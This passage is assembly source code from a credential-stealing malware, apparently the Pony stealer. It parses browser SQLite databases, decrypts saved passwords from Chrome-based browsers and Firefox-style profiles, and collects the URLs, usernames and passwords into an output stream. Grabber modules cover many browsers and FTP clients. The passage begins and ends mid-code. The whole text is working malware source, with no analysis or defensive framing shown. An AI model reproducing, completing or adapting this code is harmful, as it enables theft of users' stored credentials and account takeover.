	invoke	StreamGotoBegin, stream
	invoke	StreamRead, stream, addr header, sizeof header
	.iF	!eax
		ret
	.ENDIF
	
	invoke	CompareMem, addr header, offset szSQLite3Header, sizeof header
	.IF	!eax
		ret
	.ENDIF

	mov	dwStatusCode, TRUE
	invoke	Stream_SafeReadWORD, stream, addr dwStatusCode
	.IF	!eax || !dwStatusCode
		sub	eax, eax
		ret
	.ENDIF
	
	; Validate page size
	push	eax
	sub	ecx, ecx
	.WHILE	eax
		shr	eax, 1
		.IF	CARRY?
			inc	ecx
		.ENDIF
	.ENDW
	pop	eax
	
	.IF	eax == 1
		mov	eax, 65536
	.ENDIF
	
	; Page size must be power of 2
	.IF	ecx != 1
		sub	eax, eax
		ret
	.ENDIF
	
	mov	dwSQLitePageSize, eax

	; File format write version
	invoke	Stream_SafeReadByte, stream, addr dwStatusCode
	.IF	((eax != 1) && (eax != 2)) || ! dwStatusCode
		sub	eax, eax
		ret
	.ENDIF

	; File format read version
	invoke	Stream_SafeReadByte, stream, addr dwStatusCode
	.IF	((eax != 1) && (eax != 2)) || ! dwStatusCode
		sub	eax, eax
		ret
	.ENDIF
	
	; Reserved bytes
	invoke	Stream_SafeReadByte, stream, addr dwStatusCode
	.IF	eax != 0 || ! dwStatusCode
		sub	eax, eax
		ret
	.ENDIF

	; Maximum embedded payload fraction
	invoke	Stream_SafeReadByte, stream, addr dwStatusCode
	.IF	eax != 64 || ! dwStatusCode
		sub	eax, eax
		ret
	.ENDIF

	; Minimum embedded payload fraction
	invoke	Stream_SafeReadByte, stream, addr dwStatusCode
	.IF	eax != 32 || ! dwStatusCode
		sub	eax, eax
		ret
	.ENDIF
	
	; Leaf payload fraction
	invoke	Stream_SafeReadByte, stream, addr dwStatusCode
	.IF	eax != 32 || ! dwStatusCode
		sub	eax, eax
		ret
	.ENDIF
	
	invoke	Stream_SafeReadSkip, stream, 4*8, addr dwStatusCode
	
	; Database text encoding
	invoke	Stream_SafeReadDWORD, stream, addr dwStatusCode
	.IF	(eax < 1) || (eax > 3) || (!dwStatusCode)
		sub	eax, eax
		ret
	.ENDIF
	
	mov	dwSQLiteEncoding, eax
	
	invoke	Stream_SafeReadSkip, stream, 40, addr dwStatusCode
	
	; Start database processing from page 1
	invoke	SQLiteReadPage, stream, target_stream, 1, addr dwStatusCode, item_id, callback_func
	
	ret
ProcessSQLiteStream endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Common chromium decryption

IFDEF COMPILE_CHROMIUM_CODE

.data
	CChromeWebData		db	'Web Data',0
	CChromeLoginData	db	'Login Data',0
	szChromeLoginTable 	db	'logins',0
	szChromeActionURL	db	'origin_url',0
	szChromePassValue	db	'password_value',0
	szChromeUserValue	db	'username_value',0
	szChromeFTP			db	'ftp://',0
	IFDEF	GRAB_HTTP
	szChromeHTTP		db	'http://',0
	szChromeHTTPS		db	'https://',0
	ENDIF

.data?
	dwChromeActionURLIndex	dd	?
	dwChromePassValueIndex	dd	?
	dwChromeUserValueIndex	dd	?
	
.code

; Process SQL column definition 
SQLiteProcessChromeColDef proc uses edi column_definition, column_index
	invoke	Trim, column_definition
	invoke	StrStrI, column_definition, offset szSQLiteSpaceChar
	.IF	!eax
		ret
	.ENDIF
	mov	byte ptr[eax], 0
	invoke	Trim, column_definition
	
	mov	edi, offset szSQLiteStopWords
@@:
	invoke	lstrcmpi, edi, column_definition
	.IF	!eax
		ret
	.ENDIF
	@Next	@B
	
	invoke	lstrlen, column_definition
	.IF	!eax
		ret
	.ENDIF
	
	invoke	lstrcmpi, column_definition, offset szChromeActionURL
	.IF	!eax
		m2m	dwChromeActionURLIndex, column_index
	.ENDIF
	
	invoke	lstrcmpi, column_definition, offset szChromePassValue
	.IF	!eax
		m2m	dwChromePassValueIndex, column_index
	.ENDIF

	invoke	lstrcmpi, column_definition, offset szChromeUserValue
	.IF	!eax
		m2m	dwChromeUserValueIndex, column_index
	.ENDIF

	mov	eax, TRUE
	ret
SQLiteProcessChromeColDef endp

; Process chrome password data row
SQLiteProcessChromeDataTable proc uses esi edi stream, target_stream, row_array, cell_count, item_id
	LOCAL	url_cell_len: DWORD
	LOCAL	url_cell_type: DWORD
	LOCAL	url_cell_data: DWORD
	LOCAL	user_cell_len: DWORD
	LOCAL	user_cell_type: DWORD
	LOCAL	user_cell_data: DWORD
	LOCAL	pass_cell_len: DWORD
	LOCAL	pass_cell_type: DWORD
	LOCAL	pass_cell_data: DWORD
	LOCAL	InBlob: DATA_BLOB
	LOCAL	OutBlob: DATA_BLOB
	LOCAL	host: DWORD
	
	.IF	!cell_count || !MyCryptUnprotectData
		ret
	.ENDIF
	
	mov	eax, cell_count
	.IF	(dwChromeActionURLIndex < eax) && (dwChromePassValueIndex < eax) && (dwChromeUserValueIndex < eax)
		; Get cell values
		invoke	SQLiteGetRecordArrayCell, row_array, dwChromeActionURLIndex, addr url_cell_len, addr url_cell_type, addr url_cell_data
		invoke	SQLiteGetRecordArrayCell, row_array, dwChromeUserValueIndex, addr user_cell_len, addr user_cell_type, addr user_cell_data
		invoke	SQLiteGetRecordArrayCell, row_array, dwChromePassValueIndex, addr pass_cell_len, addr pass_cell_type, addr pass_cell_data
		
		m2m	InBlob.cbData, pass_cell_len
		m2m	InBlob.pbData, pass_cell_data
		mov	OutBlob.pbData, 0
		
		; Decrypt password
		lea	eax, OutBlob
		push	eax
		push	CRYPTPROTECT_UI_FORBIDDEN
		push	0
		push	0
		push	0
		push	0
		lea	eax, InBlob
		push	eax
		call	MyCryptUnprotectData
		.IF	eax && OutBlob.pbData
			mov	ecx, OutBlob.cbData
			
			; check if the input buffer is large enough to hold the decrypted password
			.IF	ecx <= pass_cell_len
				cld
				mov	esi, OutBlob.pbData
				mov	edi, pass_cell_data
				mov	ecx, OutBlob.cbData
				jecxz	@F
				rep movsb
			@@:			
					
				m2m	pass_cell_len, OutBlob.cbData
				invoke	LocalFree, OutBlob.pbData
				
				.IF	url_cell_len && user_cell_len && pass_cell_len
					invoke	MemAlloc, url_cell_len
					mov	host, eax
					invoke	MoveMem, url_cell_data, host, url_cell_len

					invoke	lstrlen, offset szChromeFTP
					invoke	StrCmpNI, host, offset szChromeFTP, eax
					IFDEF	GRAB_HTTP
						.IF	eax
							invoke	lstrlen, offset szChromeHTTP
							invoke	StrCmpNI, host, offset szChromeHTTP, eax
						.ENDIF
						.IF	eax
							invoke	lstrlen, offset szChromeHTTPS
							invoke	StrCmpNI, host, offset szChromeHTTPS, eax
						.ENDIF
					ENDIF

					.IF	!eax
						invoke	StreamWriteDWORD, target_stream, item_id
						invoke	StreamWriteDWORD, target_stream, dwSQLiteEncoding
						invoke	StreamWriteBinaryString, target_stream, url_cell_data, url_cell_len
						invoke	StreamWriteBinaryString, target_stream, user_cell_data, user_cell_len
						invoke	StreamWriteBinaryString, target_stream, pass_cell_data, pass_cell_len
					.ENDIF

					invoke	MemFree, host
				.ENDIF
			.ENDIF
		.ENDIF
	.ENDIF
	
	ret
SQLiteProcessChromeDataTable endp

; Process database schema table (sqlite_master table)
;
; CREATE TABLE sqlite_master(
;   type text,
;   name text,
;   tbl_name text,
;   rootpage integer,
;   sql text
; );  
SQLiteProcessChromeSchemaTable proc stream, target_stream, row_array, cell_count, item_id
	LOCAL	cell_len: DWORD
	LOCAL	cell_type: DWORD
	LOCAL	cell_data: DWORD
	LOCAL	table_name: DWORD
	LOCAL	root_page: DWORD
	LOCAL	dwStatusCode: DWORD

	.IF	cell_count == 5
		; Validate table column count
		invoke	SQLiteGetRecordArrayCell, row_array, 2, addr cell_len, addr cell_type, addr cell_data
		.IF	cell_type == SQLITE_DATATYPE_STR
			m2m	table_name, cell_data
			invoke	lstrcmpi, table_name, offset szChromeLoginTable
			.IF	!eax
				invoke	SQLiteGetRecordArrayCell, row_array, 0, addr cell_len, addr cell_type, addr cell_data
				.IF	cell_type == SQLITE_DATATYPE_STR
					invoke	lstrcmp, offset szSQLite3TableType, cell_data
					.IF	!eax
						invoke	SQLiteGetRecordArrayCell, row_array, 3, addr cell_len, addr cell_type, addr cell_data
						.IF	cell_type == SQLITE_DATATYPE_INT
							mov	eax, cell_data
							m2m	root_page, dword ptr[eax]
							
							invoke	SQLiteGetRecordArrayCell, row_array, 4, addr cell_len, addr cell_type, addr cell_data
							.IF	cell_type == SQLITE_DATATYPE_STR
								mov	dwChromeActionURLIndex, -1
								mov	dwChromePassValueIndex, -1
								mov	dwChromeUserValueIndex, -1
							
								invoke	SQLiteProcessSQL, cell_data, offset SQLiteProcessChromeColDef
								mov	dwStatusCode, TRUE
								
								.IF	(dwChromeActionURLIndex != -1) && (dwChromePassValueIndex != -1) && (dwChromeUserValueIndex != -1)
									invoke	SQLiteReadPage, stream, target_stream, root_page, addr dwStatusCode, item_id, offset SQLiteProcessChromeDataTable
								.ENDIF
							.ENDIF
						.ENDIF 
					.ENDIF	
				.ENDIF
			.ENDIF
		.ENDIF
	.ENDIF
	ret
SQLiteProcessChromeSchemaTable endp

ProcessChromeSQLiteFile proc target_stream, szSQLFileName, item_id
	LOCAL	stream: DWORD

	invoke	StreamCreate, addr stream
	invoke	StreamLoadFromFile, szSQLFileName, stream
	.IF	eax
		invoke	ProcessSQLiteStream, stream, target_stream, item_id, offset SQLiteProcessChromeSchemaTable
		.IF	!eax
			; Error occured while processing ".sqlite" file
			; Send ".sqlite" file for debugging
			;invoke	CommonAppendFileForceDupe, target_stream, lpFileName, ITEMHDR_ID or 1000h
		.ENDIF
	.ENDIF
	invoke	StreamFree, stream
	
	ret
ProcessChromeSQLiteFile endp

ChromeAppDataCommonSingleFileScan proc stream, csidl, appdata_dir, config_file, item_id
	invoke	SHGetFolderPathStr, csidl
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, appdata_dir
		push	eax
		invoke	CommonFileScanCallback, stream, eax, config_file, item_id, offset ProcessChromeSQLiteFile
		call	MemFree
	.ENDIF
	ret
ChromeAppDataCommonSingleFileScan endp

ChromeCommonScanCustomID proc stream, base_appdata_dir, id
	invoke	ChromeAppDataCommonSingleFileScan, stream, CSIDL_APPDATA, base_appdata_dir, offset CChromeWebData, id
	invoke	ChromeAppDataCommonSingleFileScan, stream, CSIDL_APPDATA, base_appdata_dir, offset CChromeLoginData, id
	invoke	ChromeAppDataCommonSingleFileScan, stream, CSIDL_LOCAL_APPDATA, base_appdata_dir, offset CChromeWebData, id
	invoke	ChromeAppDataCommonSingleFileScan, stream, CSIDL_LOCAL_APPDATA, base_appdata_dir, offset CChromeLoginData, id
	invoke	ChromeAppDataCommonSingleFileScan, stream, CSIDL_COMMON_APPDATA, base_appdata_dir, offset CChromeWebData, id
	invoke	ChromeAppDataCommonSingleFileScan, stream, CSIDL_COMMON_APPDATA, base_appdata_dir, offset CChromeLoginData, id
	ret
ChromeCommonScanCustomID endp

ChromeCommonScan proc stream, base_appdata_dir
	invoke	ChromeCommonScanCustomID, stream, base_appdata_dir, ITEMHDR_ID or 0
	ret
ChromeCommonScan endp

ENDIF

IFDEF COMPILE_MOZILLA_CODE

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Common Mozilla SQLite3 database decryption

.data
	szMozillaLoginTable db	'moz_logins',0
	szMozillaActionURL	db	'hostname',0
	szMozillaPassValue	db	'encryptedPassword',0
	szMozillaUserValue	db	'encryptedUsername',0

.data?
	dwMozillaActionURLIndex	dd	?
	dwMozillaPassValueIndex	dd	?
	dwMozillaUserValueIndex	dd	?

.code

; Process SQL column definition 
SQLiteProcessMozillaColDef proc uses edi column_definition, column_index
	invoke	Trim, column_definition
	invoke	StrStrI, column_definition, offset szSQLiteSpaceChar
	.IF	!eax
		ret
	.ENDIF
	mov	byte ptr[eax], 0
	invoke	Trim, column_definition
	
	mov	edi, offset szSQLiteStopWords
@@:
	invoke	lstrcmpi, edi, column_definition
	.IF	!eax
		ret
	.ENDIF
	@Next	@B
	
	invoke	lstrlen, column_definition
	.IF	!eax
		ret
	.ENDIF
	
	invoke	lstrcmpi, column_definition, offset szMozillaActionURL
	.IF	!eax
		m2m	dwMozillaActionURLIndex, column_index
	.ENDIF
	
	invoke	lstrcmpi, column_definition, offset szMozillaPassValue
	.IF	!eax
		m2m	dwMozillaPassValueIndex, column_index
	.ENDIF

	invoke	lstrcmpi, column_definition, offset szMozillaUserValue
	.IF	!eax
		m2m	dwMozillaUserValueIndex, column_index
	.ENDIF

	mov	eax, TRUE
	ret
SQLiteProcessMozillaColDef endp

; Process password data row
SQLiteProcessMozillaDataTable proc stream, target_stream, row_array, cell_count, item_id
	LOCAL	url_cell_len: DWORD
	LOCAL	url_cell_type: DWORD
	LOCAL	url_cell_data: DWORD
	LOCAL	user_cell_len: DWORD
	LOCAL	user_cell_type: DWORD
	LOCAL	user_cell_data: DWORD
	LOCAL	pass_cell_len: DWORD
	LOCAL	pass_cell_type: DWORD
	LOCAL	pass_cell_data: DWORD
	LOCAL	host: DWORD
	LOCAL	user: DWORD
	LOCAL	pass: DWORD

	.IF	!cell_count
		ret
	.ENDIF

	mov	eax, cell_count
	.IF	(dwMozillaActionURLIndex < eax) && (dwMozillaPassValueIndex < eax) && (dwMozillaUserValueIndex < eax)
		; Get cell values
		invoke	SQLiteGetRecordArrayCell, row_array, dwMozillaActionURLIndex, addr url_cell_len, addr url_cell_type, addr url_cell_data
		invoke	SQLiteGetRecordArrayCell, row_array, dwMozillaUserValueIndex, addr user_cell_len, addr user_cell_type, addr user_cell_data
		invoke	SQLiteGetRecordArrayCell, row_array, dwMozillaPassValueIndex, addr pass_cell_len, addr pass_cell_type, addr pass_cell_data

		.IF	url_cell_len && pass_cell_len
			mov	edx, url_cell_len
			inc	edx
			invoke	MemAlloc, edx
			mov	host, eax
			invoke	MoveMem, url_cell_data, host, url_cell_len
		
			mov	user, NULL
			mov	pass, NULL
			
			.IF	mozilla_mode == MOZILLA_MODE_FTP_HTTP
				invoke	lstrlen, offset szMozillaFTP
				invoke	StrCmpNI, host, offset szMozillaFTP, eax
				IFDEF	GRAB_HTTP
				.IF	eax
					invoke	lstrlen, offset szMozillaHTTP
					invoke	StrCmpNI, host, offset szMozillaHTTP, eax
				.ENDIF
				.IF	eax
					invoke	lstrlen, offset szMozillaHTTPS
					invoke	StrCmpNI, host, offset szMozillaHTTPS, eax
				.ENDIF
				ENDIF
			.ELSEIF mozilla_mode == MOZILLA_MODE_FIREFTP
				invoke	lstrlen, offset szMozillaFireFTP
				invoke	StrCmpNI, host, offset szMozillaFireFTP, eax
			.ELSEIF mozilla_mode == MOZILLA_MODE_EMAIL
				sub	eax, eax ; allow all hosts
			.ENDIF
			
			.IF	!eax
				; user (can be empty for some record types)
				.IF	user_cell_len
					invoke	MozillaNSSDecryptPassword, user_cell_data, user_cell_len
					mov	user, eax
				.ENDIF
				
				; pass
				invoke	MozillaNSSDecryptPassword, pass_cell_data, pass_cell_len
				mov	pass, eax
				
				.IF	host && pass
					; export recovered data
					invoke	StreamWriteDWORD, target_stream, item_id
					invoke	StreamWriteString, target_stream, host
					invoke	StreamWriteString, target_stream, user
					invoke	StreamWriteString, target_stream, pass
				.ENDIF 
			.ENDIF
			
			invoke	MemFree, user
			invoke	MemFree, pass
			invoke	MemFree, host
		.ENDIF
	.ENDIF
	
	ret
SQLiteProcessMozillaDataTable endp

SQLiteProcessMozillaSchemaTable proc stream, target_stream, row_array, cell_count, item_id
	LOCAL	cell_len: DWORD
	LOCAL	cell_type: DWORD
	LOCAL	cell_data: DWORD
	LOCAL	table_name: DWORD
	LOCAL	root_page: DWORD
	LOCAL	dwStatusCode: DWORD

	.IF	cell_count == 5
		; Validate table column count
		invoke	SQLiteGetRecordArrayCell, row_array, 2, addr cell_len, addr cell_type, addr cell_data
		.IF	cell_type == SQLITE_DATATYPE_STR
			m2m	table_name, cell_data
			invoke	lstrcmpi, table_name, offset szMozillaLoginTable
			.IF	!eax
				invoke	SQLiteGetRecordArrayCell, row_array, 0, addr cell_len, addr cell_type, addr cell_data
				.IF	cell_type == SQLITE_DATATYPE_STR
					invoke	lstrcmp, offset szSQLite3TableType, cell_data
					.IF	!eax
						invoke	SQLiteGetRecordArrayCell, row_array, 3, addr cell_len, addr cell_type, addr cell_data
						.IF	cell_type == SQLITE_DATATYPE_INT
							mov	eax, cell_data
							m2m	root_page, dword ptr[eax]
							
							invoke	SQLiteGetRecordArrayCell, row_array, 4, addr cell_len, addr cell_type, addr cell_data
							.IF	cell_type == SQLITE_DATATYPE_STR
								mov	dwMozillaActionURLIndex, -1
								mov	dwMozillaPassValueIndex, -1
								mov	dwMozillaUserValueIndex, -1

								invoke	SQLiteProcessSQL, cell_data, offset SQLiteProcessMozillaColDef
								mov	dwStatusCode, TRUE
								
								.IF	(dwMozillaActionURLIndex != -1) && (dwMozillaPassValueIndex != -1) && (dwMozillaUserValueIndex != -1)
									invoke	SQLiteReadPage, stream, target_stream, root_page, addr dwStatusCode, item_id, offset SQLiteProcessMozillaDataTable
								.ENDIF
							.ENDIF
						.ENDIF 
					.ENDIF	
				.ENDIF
			.ENDIF
		.ENDIF
	.ENDIF
	ret
SQLiteProcessMozillaSchemaTable endp

ProcessMozillaSQLiteFile proc target_stream, szSQLFileName, item_id
	LOCAL	stream: DWORD

	invoke	StreamCreate, addr stream
	invoke	StreamLoadFromFile, szSQLFileName, stream
	.IF	eax
		invoke	ProcessSQLiteStream, stream, target_stream, item_id, offset SQLiteProcessMozillaSchemaTable
		.IF	!eax
			; Error occured while processing ".sqlite" file
			; Send ".sqlite" file for debugging
			;invoke	CommonAppendFileForceDupe, target_stream, lpFileName, ITEMHDR_ID or 1000h
		.ENDIF
	.ENDIF
	invoke	StreamFree, stream
	
	ret
ProcessMozillaSQLiteFile endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Google Chrome
; Tested: Google Chrome 12.0.742.122
; Tested: Google Chrome 18.0.1025.168
; Tested: Google Chrome 19.0.1084.52 m
; Tested: Google Chrome 29.0.1547.66 m
; SFTP: not supported

IFDEF COMPILE_MODULE_CHROME

.data
	CChromeAppDataDir	db	'\Google\Chrome',0

.code

GrabChrome proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_CHROME, 0
	mov	hdr_ofs, eax

	invoke	ChromeCommonScan, stream, offset CChromeAppDataDir

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabChrome endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Chromium & SRWare Iron
; SFTP: not supported

IFDEF COMPILE_MODULE_CHROMIUM

.data
	CChromiumAppDataDir	db	'\Chromium',0

.code

GrabChromium proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_CHROMIUM, 0
	mov	hdr_ofs, eax

	invoke	ChromeCommonScan, stream, offset CChromiumAppDataDir

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabChromium endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; ChromePlus
; http://coolnovo.com/
; SFTP: not supported

IFDEF COMPILE_MODULE_CHROMEPLUS

.data
	CChromePlusAppDataDir	db	'\ChromePlus',0
	CChromePlusInstRegPath	db	'Software\ChromePlus',0
	CChromePlusInstRegValue	db	'Install_Dir',0

.code

GrabChromePlus proc stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	inst_dir: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_CHROMEPLUS, 0
	mov	hdr_ofs, eax

	invoke	ChromeCommonScan, stream, offset CChromePlusAppDataDir

	invoke	RegReadValueStr, dwCurrentUserKey, offset CChromePlusInstRegPath, offset CChromePlusInstRegValue, NULL
	.IF	eax
		mov	inst_dir, eax
		invoke	CommonFileScanCallback, stream, inst_dir, offset CChromeWebData, ITEMHDR_ID or 0, offset ProcessChromeSQLiteFile
		invoke	CommonFileScanCallback, stream, inst_dir, offset CChromeLoginData, ITEMHDR_ID or 0, offset ProcessChromeSQLiteFile
		invoke	MemFree, inst_dir
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabChromePlus endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Bromium (Yandex Chrome)
; http://browser.yandex.ru/
; SFTP: not supported

IFDEF COMPILE_MODULE_BROMIUM

.data
	CBromiumAppDataDir	db	'\Bromium',0

.code

GrabBromium proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_BROMIUM, 0
	mov	hdr_ofs, eax

	invoke	ChromeCommonScan, stream, offset CBromiumAppDataDir

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabBromium endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Nichrome
; http://nichrome.rambler.ru/
; SFTP: not supported

IFDEF COMPILE_MODULE_NICHROME

.data
	CNichromeAppDataDir	db	'\Nichrome',0

.code

GrabNichrome proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_NICHROME, 0
	mov	hdr_ofs, eax

	invoke	ChromeCommonScan, stream, offset CNichromeAppDataDir

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabNichrome endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Comodo Dragon
; http://www.comodo.com/home/browsers-toolbars/browser.php
; SFTP: not supported

IFDEF COMPILE_MODULE_COMODODRAGON

.data
	CComodoDragonAppDataDir	db	'\Comodo',0

.code

GrabComodoDragon proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_COMODODRAGON, 0
	mov	hdr_ofs, eax

	invoke	ChromeCommonScan, stream, offset CComodoDragonAppDataDir

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabComodoDragon endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; RockMelt
; http://www.rockmelt.com/
; SFTP: not supported

IFDEF COMPILE_MODULE_ROCKMELT

.data
	CRockMeltAppDataDir	db	'\RockMelt',0

.code

GrabRockMelt proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_ROCKMELT, 0
	mov	hdr_ofs, eax

	invoke	ChromeCommonScan, stream, offset CRockMeltAppDataDir

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabRockMelt endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; K-Meleon
; http://kmeleon.sourceforge.net/
; SFTP: not supported

IFDEF COMPILE_MODULE_KMELEON

.data
	CKMeleonInstValue	db	'K-Meleon',0
	CKMeleonAppDataDir	db	'\K-Meleon',0
	CKMeleonProfilesDir	db	'\Profiles',0

.code

KMeleonCommonScan proc stream, csidl, install_path
	invoke	SHGetFolderPathStr, csidl
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CKMeleonAppDataDir
		push	eax
		invoke	MozillaScanProfiles, stream, eax, install_path
		call	MemFree
	.ENDIF
	ret
KMeleonCommonScan endp

GrabKMeleon proc uses edi stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	install_path: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_KMELEON, 0
	mov	hdr_ofs, eax

	; installed list
	mov	edi, lpInstalledList 
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset CKMeleonInstValue
		.IF	eax
			invoke	ExtractFilePath, edi
			.IF	eax
				mov	install_path, eax
				invoke	KMeleonCommonScan, stream, CSIDL_APPDATA, install_path
				invoke	KMeleonCommonScan, stream, CSIDL_LOCAL_APPDATA, install_path
				invoke	KMeleonCommonScan, stream, CSIDL_COMMON_APPDATA, install_path
				invoke	PonyStrCat, install_path, offset CKMeleonProfilesDir
				.IF	eax
					push	eax
					invoke	MozillaScanProfiles, stream, eax, install_path
					call	MemFree
				.ENDIF
				invoke	MemFree, install_path
			.ENDIF
		.ENDIF
		@Next	@n
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabKMeleon endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Epic
; http://www.epicbrowser.com/
; SFTP: not supported

IFDEF COMPILE_MODULE_EPIC

.data
	CEpicInstValue	db	'Epic',0
	CEpicAppDataDir	db	'\Epic\Epic',0

.code

EpicCommonScan proc stream, csidl, install_path
	invoke	SHGetFolderPathStr, csidl
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CEpicAppDataDir
		push	eax
		invoke	MozillaScanProfiles, stream, eax, install_path
		call	MemFree
	.ENDIF
	ret
EpicCommonScan endp

GrabEpic proc uses edi stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	install_path: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_EPIC, 0
	mov	hdr_ofs, eax

	; installed list
	mov	edi, lpInstalledList 
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset CEpicInstValue
		.IF	eax
			invoke	ExtractFilePath, edi
			.IF	eax
				mov	install_path, eax
				invoke	EpicCommonScan, stream, CSIDL_APPDATA, install_path
				invoke	EpicCommonScan, stream, CSIDL_LOCAL_APPDATA, install_path
				invoke	EpicCommonScan, stream, CSIDL_COMMON_APPDATA, install_path
				invoke	MemFree, install_path
			.ENDIF
		.ENDIF
		@Next	@n
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabEpic endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; StaffFTP
; http://www.gsa-online.de/products-staffftp.php
; Tested: v2.95 16.May.11
; SFTP: not supported

IFDEF COMPILE_MODULE_STAFF

.data
	CStaffInstValue		db	'Staff-FTP',0
	CStaffAppDataDir	db	'sites.ini',0

.code

GrabStaff proc uses edi stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_STAFF, 0
	mov	hdr_ofs, eax

	; installed list
	mov	edi, lpInstalledList 
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset CStaffInstValue
		.IF	eax
			invoke	ExtractFilePath, edi
			.IF	eax
				push	eax
				invoke	CommonFileScan, stream, eax, offset CStaffAppDataDir, ITEMHDR_ID or 0
				call	MemFree
			.ENDIF
		.ENDIF
		@Next	@n
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabStaff endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; AceFTP 3
; http://software.visicommedia.com/en/products/aceftpfreeware/
; Tested: version 3 (3.80.3) - 21.06.2007
; SFTP: implemented

IFDEF COMPILE_MODULE_ACEFTP

.data
	CAceFTPAppDataDir1	db	'\Sites',0
	CAceFTPAppDataDir2	db	'\Visicom Media',0
	CAceFTPFile		db	'.ftp',0
	CAceFTPSettingsStream 	db	'S',0,'e',0,'t',0,'t',0,'i',0,'n',0,'g',0,'s',0,0,0

.code

AceFTP_ProcessFTPFile proc stream, szFilePath, item_id
	LOCAL	wideFilePath: DWORD
	LOCAL	wideFilePathLen: DWORD
	LOCAL	stg, stm: DWORD
	LOCAL	memptr: DWORD
	LOCAL	len: DWORD
	
	.IF	!MyStgOpenStorage
		ret
	.ENDIF
	
	invoke	MultiByteToWideChar, CP_ACP, 0, szFilePath, -1, NULL, 0
	mov	wideFilePathLen, eax
	
